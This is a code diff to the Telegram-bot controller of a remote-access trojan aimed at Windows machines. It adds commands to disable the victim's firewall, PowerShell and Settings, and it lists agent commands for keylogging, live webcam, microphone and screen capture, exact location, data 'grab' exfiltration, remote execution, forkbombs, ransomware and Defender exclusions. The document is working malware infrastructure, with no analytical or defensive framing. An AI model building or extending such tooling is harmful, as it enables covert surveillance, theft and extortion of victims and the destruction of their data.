@@ -1,6 +1,7 @@
-# app.py (v44.1_RESTORE_CMDS)
-# - ADDED: New system restore commands (/restorefirewall, /restoresystemreset, etc.) to the command handler.
-# - MODIFIED: Updated the /help menu with a new "System Restore" section to list the new commands.
+# app.py (v45.1_CLEANUP)
+# - ADDED: New lockdown commands (/disablepowershell, /disablesettings, /disablefirewall) to match the agent.
+# - REMOVED: The "/disableuninstall" and "/restoreuninstall" commands have been completely removed.
+# - MODIFIED: Updated the /help menu to reflect all current agent capabilities.
 
 import os
 import re
@@ -219,16 +220,19 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "<code>/blockmouse</code> - Disable mouse input\n"
         "<code>/unblockmouse</code> - Enable mouse input\n\n"
         "<b>🛡️ SYSTEM LOCKDOWN (Admin)</b>\n"
+        "<code>/disablefirewall</code> - Disable the system firewall\n"
         "<code>/disabletaskmgr</code> - Disable Task Manager\n"
         "<code>/disablecmd</code> - Disable Command Prompt\n"
-        "<code>/disableuninstall</code> - Disable App Uninstall\n"
+        "<code>/disablepowershell</code> - Disable PowerShell console\n"
+        "<code>/disablesettings</code> - Disable Settings app & Control Panel\n"
         "<code>/disablebrowserdownloads</code> - Block browser file downloads\n\n"
         "<b>♻️ SYSTEM RESTORE (Admin)</b>\n"
+        "<code>/restorefirewall</code> - Re-enable the system firewall\n"
         "<code>/restoretaskmgr</code> - Restore Task Manager\n"
         "<code>/restorecmd</code> - Restore Command Prompt\n"
-        "<code>/restoreuninstall</code> - Restore App Uninstall\n"
+        "<code>/restorepowershell</code> - Restore PowerShell console\n"
+        "<code>/restoresettings</code> - Restore Settings app & Control Panel\n"
         "<code>/restorebrowserdownloads</code> - Restore browser file downloads\n"
-        "<code>/restorefirewall</code> - Re-enable the system firewall\n"
         "<code>/restoresystemreset</code> - Re-enable the 'Reset this PC' feature\n"
         "<code>/restoredefendernotifications</code> - Restore Defender notifications\n"
         "<code>/removedefenderexclusion</code> - Remove agent's Defender exclusion\n\n"
@@ -258,17 +262,29 @@ ptb_app.add_handler(CommandHandler("destroy", cmd_destroy))
 ptb_app.add_handler(CommandHandler("upload", cmd_upload))
 
 agent_commands = [
-    "info", "exec", "ss", "cam", "getexactlocation", "startkeylogger", "stopkeylogger", 
+    # System & Info
+    "info", "exec", "getexactlocation",
+    # Surveillance
+    "ss", "cam", "startkeylogger", "stopkeylogger", 
+    # Live Streaming
     "livestream", "stoplivestream", "livecam", "stoplivecam", "livemic", "stoplivemic", 
-    "grab", "ls", "cd", "download", "pwd", "blockkeyboard", "unblockkeyboard", "blockmouse", 
-    "unblockmouse", "forkbomb", "cancelforkbomb", "ransomware", "restore", "tts", 
-    "blockwebsite", "unblockwebsite", "flashscreen", "stopflashscreen", "jumpscare", 
+    # Live Interaction
     "startchat", "sendchat", "stopchat",
-    # Lockdown Commands
-    "disabletaskmgr", "restoretaskmgr", "disablecmd", "restorecmd", "disableuninstall", 
-    "restoreuninstall", "disablebrowserdownloads", "restorebrowserdownloads",
-    # New Restore Commands
-    "restorefirewall", "restoresystemreset", "restoredefendernotifications", "removedefenderexclusion"
+    # Mischief
+    "tts", "flashscreen", "stopflashscreen", "jumpscare", 
+    # Input & Website Control
+    "blockwebsite", "unblockwebsite", "blockkeyboard", "unblockkeyboard", "blockmouse", "unblockmouse",
+    # System Lockdown
+    "disablefirewall", "disabletaskmgr", "disablecmd", "disablepowershell", "disablesettings", "disablebrowserdownloads",
+    # System Restore
+    "restorefirewall", "restoretaskmgr", "restorecmd", "restorepowershell", "restoresettings", "restorebrowserdownloads",
+    "restoresystemreset", "restoredefendernotifications", "removedefenderexclusion",
+    # Data Exfiltration
+    "grab",
+    # File System
+    "ls", "cd", "pwd", "download",
+    # Destructive
+    "forkbomb", "cancelforkbomb", "ransomware", "restore"
 ]
 for cmd in agent_commands: ptb_app.add_handler(CommandHandler(cmd, generic_command_handler))
 
